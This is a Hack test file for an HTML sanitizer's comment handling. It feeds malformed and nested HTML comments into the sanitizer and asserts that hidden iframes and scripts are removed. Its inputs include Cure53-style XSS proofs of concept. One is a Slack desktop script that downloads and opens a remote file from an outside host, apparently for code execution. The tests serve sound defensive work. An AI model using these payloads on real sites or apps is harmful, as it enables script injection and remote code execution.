/* Created by Jake Polacek on 11/08/2021 */

namespace HTMLPurifier\_Private\Tests;

use function Facebook\FBExpect\expect;
use type Facebook\HackTest\HackTest;
use namespace HTMLPurifier;
use namespace HTMLPurifier\{Strategy, Token, Lexer, Enums};

class CommentRemovalTest extends HackTest {
	public function testValidCommentRemoval(): void {
		echo "\nrunning testValidCommentRemoval()...";
		$config = HTMLPurifier\HTMLPurifier_Config::createDefault();
		$policy = HTMLPurifier\HTMLSanitizerPolicy::fromDefault();
		$purifier = new HTMLPurifier\HTMLPurifier($config, $policy->constructPolicy());
		$dirty_html1 = '<!-- normal comment -->';
		$dirty_html2 = '<!-- comment --><b>Hello World!</b>';
		$dirty_html3 = '<!-- begin --><b>Hello World!</b><!-- end -->';

		$clean_html1 = $purifier->purify($dirty_html1);
		$clean_html2 = $purifier->purify($dirty_html2);
		$clean_html3 = $purifier->purify($dirty_html3);

		expect($clean_html1)->toEqual('');
		expect($clean_html2)->toEqual('<b>Hello World!</b>');
		expect($clean_html3)->toEqual('<b>Hello World!</b>');
	}

	public function testParseErrorCommentRemoval(): void {
		echo "\nrunning testParseErrorCommentRemoval()...";
		$config = HTMLPurifier\HTMLPurifier_Config::createDefault();
		$policy = HTMLPurifier\HTMLSanitizerPolicy::fromDefault();
		$purifier = new HTMLPurifier\HTMLPurifier($config, $policy->constructPolicy());

		$dirty_html1 = '<!-->'; // abruptly closed comment
		$dirty_html2 = '<!--->'; // abruptly closed comment
		$dirty_html3 = '<!-- incorrectly closed comment --!>';
		$dirty_html4 = '<! incorrectly opened comment -->';

		$clean_html1 = $purifier->purify($dirty_html1);
		$clean_html2 = $purifier->purify($dirty_html2);
		$clean_html3 = $purifier->purify($dirty_html3);
		$clean_html4 = $purifier->purify($dirty_html4);

		expect($clean_html1)->toEqual('');
		expect($clean_html2)->toEqual('');
		expect($clean_html3)->toEqual('');
		expect($clean_html4)->toEqual('');
	}

	public function testCure53PoCCommentRemoval(): void {
		echo "\nrunning testCure53PoCCommentRemoval()...";
		$config = HTMLPurifier\HTMLPurifier_Config::createDefault();
		$policy = HTMLPurifier\HTMLSanitizerPolicy::fromDefault();
		$policy->addAllowedTagWithAttributes(
			Enums\HtmlTags::A,
			keyset[
				Enums\HtmlAttributes::ID,
				Enums\HtmlAttributes::NAME,
				Enums\HtmlAttributes::HREF,
				Enums\HtmlAttributes::TARGET,
				Enums\HtmlAttributes::REL,
			],
		);
		$purifier = new HTMLPurifier\HTMLPurifier($config, $policy->constructPolicy());

		$dirty_poc1 = '<!--><iframe srcdoc="<script>alert(document.domain)</script>">-->x';
		$dirty_poc2 = '<!---><iframe srcdoc="<script>alert(document.domain)</script>">-->x';
		$dirty_poc3 = '<!-- --!><iframe srcdoc="<script>alert(document.domain)</script>">-->x';
		$dirty_poc4 = '<!--><iframe srcdoc="<script>alert(document.domain)</script>"><!---->';
		$dirty_poc5 = '<!--><iframe srcdoc="<script>alert(document.domain)</script>">--!>';

		$clean_poc1 = $purifier->purify($dirty_poc1);
		$clean_poc2 = $purifier->purify($dirty_poc2);
		$clean_poc3 = $purifier->purify($dirty_poc3);
		$clean_poc4 = $purifier->purify($dirty_poc4);
		$clean_poc5 = $purifier->purify($dirty_poc5);

		expect($clean_poc1)->toEqual('x');
		expect($clean_poc2)->toEqual('x');
		expect($clean_poc3)->toEqual('x');
		expect($clean_poc4)->toEqual('');
		expect($clean_poc5)->toEqual('');
	}

	public function testCure53EmailPurification(): void {
		echo "\nrunning testCure53EmailPurification()...";
		$config = HTMLPurifier\HTMLPurifier_Config::createDefault();
		$policy = HTMLPurifier\HTMLSanitizerPolicy::fromEmpty();
		$policy->addAllowedTags(
			keyset[
				Enums\HtmlTags::B,
				Enums\HtmlTags::UL,
				Enums\HtmlTags::LI,
				Enums\HtmlTags::OL,
				Enums\HtmlTags::H2,
				Enums\HtmlTags::H4,
				Enums\HtmlTags::BR,
				Enums\HtmlTags::DIV,
				Enums\HtmlTags::STRONG,
				Enums\HtmlTags::DEL,
				Enums\HtmlTags::EM,
				Enums\HtmlTags::PRE,
				Enums\HtmlTags::CODE,
				Enums\HtmlTags::TABLE,
				Enums\HtmlTags::TBODY,
				Enums\HtmlTags::TD,
				Enums\HtmlTags::TH,
				Enums\HtmlTags::THEAD,
				Enums\HtmlTags::TR,
			],
		);
		$policy->addAllowedTagsWithAttributes(dict[
			Enums\HtmlTags::A => keyset[
				Enums\HtmlAttributes::ID,
				Enums\HtmlAttributes::NAME,
				Enums\HtmlAttributes::HREF,
				Enums\HtmlAttributes::TARGET,
				Enums\HtmlAttributes::REL,
			],
			Enums\HtmlTags::H3 => keyset[Enums\HtmlAttributes::CLASSES],
			Enums\HtmlTags::P => keyset[Enums\HtmlAttributes::CLASSES],
			Enums\HtmlTags::ASIDE => keyset[Enums\HtmlAttributes::CLASSES],
			Enums\HtmlTags::IMG => keyset[
				Enums\HtmlAttributes::SRC,
				Enums\HtmlAttributes::ALT,
				Enums\HtmlAttributes::CLASSES,
				Enums\HtmlAttributes::WIDTH,
				Enums\HtmlAttributes::HEIGHT,
				Enums\HtmlAttributes::SRCSET,
				Enums\HtmlAttributes::SIZES,
			],
		]);
		$purifier = new HTMLPurifier\HTMLPurifier($config, $policy->constructPolicy());

		$dirty_email1 = "<!--><script>
desktop.downloads.startDownload({
    id: 'cure53',
    teamId: 'cure53',
    url: 'https://vulnerabledoma.in/pen/slack_rce_python.php'
});
setTimeout(function(){
    desktop.downloads.openDownload('cure53','cure53');
},2000);
</script>-->x";
		$dirty_email2 =
			"<!--><iframe srcdoc='<a target='_top' href='https://files.slack.com/files-pri/[EMAIL1’s_URL_HERE]'>CLICK</a>'>-->x";

		$clean_email1 = $purifier->purify($dirty_email1);
		$clean_email2 = $purifier->purify($dirty_email2);

		expect($clean_email1)->toEqual('x');
		expect($clean_email2)->toEqual('x');
	}

	public function testNestedComments(): void {
		echo "\nrunning testFancyNestedComments()...";
		$config = HTMLPurifier\HTMLPurifier_Config::createDefault();
		$policy = HTMLPurifier\HTMLSanitizerPolicy::fromDefault();
		$purifier = new HTMLPurifier\HTMLPurifier($config, $policy->constructPolicy());
		$dirty_nested1 = '<!-- <!-- Normally nested comment --> -->';
		$dirty_nested2 = '<!--<!-->-->'; // Abruptly ended comment nested in normal comment
		$dirty_nested3 = '<!-<!-->->'; // Doubly abruptly ended nested comment
		$dirty_nested4 = '<!-- <!-- Nested Comment --> --><b>Hello World!</b><!-- Normal comment -->';

		$clean_nested1 = $purifier->purify($dirty_nested1);
		$clean_nested2 = $purifier->purify($dirty_nested2);
		$clean_nested3 = $purifier->purify($dirty_nested3);
		$clean_nested4 = $purifier->purify($dirty_nested4);

		expect($clean_nested1)->toEqual(' --&gt;');
		expect($clean_nested2)->toEqual('--&gt;');
		expect($clean_nested3)->toEqual('');
		expect($clean_nested4)->toEqual(' --&gt;<b>Hello World!</b>');
	}

	public function testLineBreakComments(): void {
		echo "\nrunning testLineBreakComments()...";
		$config = HTMLPurifier\HTMLPurifier_Config::createDefault();
		$policy = HTMLPurifier\HTMLSanitizerPolicy::fromDefault();
		$purifier = new HTMLPurifier\HTMLPurifier($config, $policy->constructPolicy());
		$dirty = '<!-->
<iframe srcdoc=
"<script>alert(document.domain)</script>">
-->x';
		$clean = $purifier->purify($dirty);
		expect($clean)->toEqual('x');
	}

	/**
	* These dirty HTML comments were designed to defeat the original non-recursive algorithm. 
	* The idea being when the original sanitizer stripped the first set of comments it would 
	* create new, valid comments after those sections were deleted that wouldn’t have been 
	* caught by the original algorithm because they were invalid until they stripped the first
	* (and second, and …) set of comments. Now, this tests that they are completely removed,
	* meaning that the iframe is also removed.
	*/
	public function testPartiallyRemovedComments(): void {
		echo "\nrunning testPartiallyRemovedComments()...";
		$config = HTMLPurifier\HTMLPurifier_Config::createDefault();
		$policy = new HTMLPurifier\HTMLPurifier_Policy(dict['a' => vec['id', 'name', 'href', 'target', 'rel']]);
		$purifier = new HTMLPurifier\HTMLPurifier($config, $policy);

		$dirty_html1 =
			'<!--<!-<!-->-->-><iframe width=100 srcdoc="<script>alert(document.domain)</script>">-<!-->-->->';
		$dirty_html2 = '<!-<!-->-->-><iframe srcdoc="<script>alert(document.domain)</script>">-<!-->-->->';
		$dirty_html3 =
			'<!-<!-<!-->-->->-<!-->-->->-><iframe srcdoc="<script>alert(document.domain)</script>">-<!-<!-->-->->-<!-->-->->->';
		$dirty_html4 =
			'<!-<!-<!-<!-->-->->-<!-->-->->->-<!-<!-->-->->-<!-->-->->->-><iframe srcdoc="<script>alert(document.domain)</script>">-<!-<!-<!-->-->->-<!-->-->->->-<!-<!-->-->->-<!-->-->->->->';

		$clean_html1 = $purifier->purify($dirty_html1);
		$clean_html2 = $purifier->purify($dirty_html2);
		$clean_html3 = $purifier->purify($dirty_html3);
		$clean_html4 = $purifier->purify($dirty_html4);

		expect($clean_html1)->toEqual('--&gt;-&gt;--&gt;');
		expect($clean_html2)->toEqual('-&gt;--&gt;');
		expect($clean_html3)->toEqual('-&gt;--&gt;-&gt;--&gt;--&gt;-&gt;');
		expect($clean_html4)->toEqual('-&gt;--&gt;-&gt;--&gt;--&gt;-&gt;-&gt;--&gt;--&gt;-&gt;--&gt;--&gt;-&gt;-&gt;');
	}
}
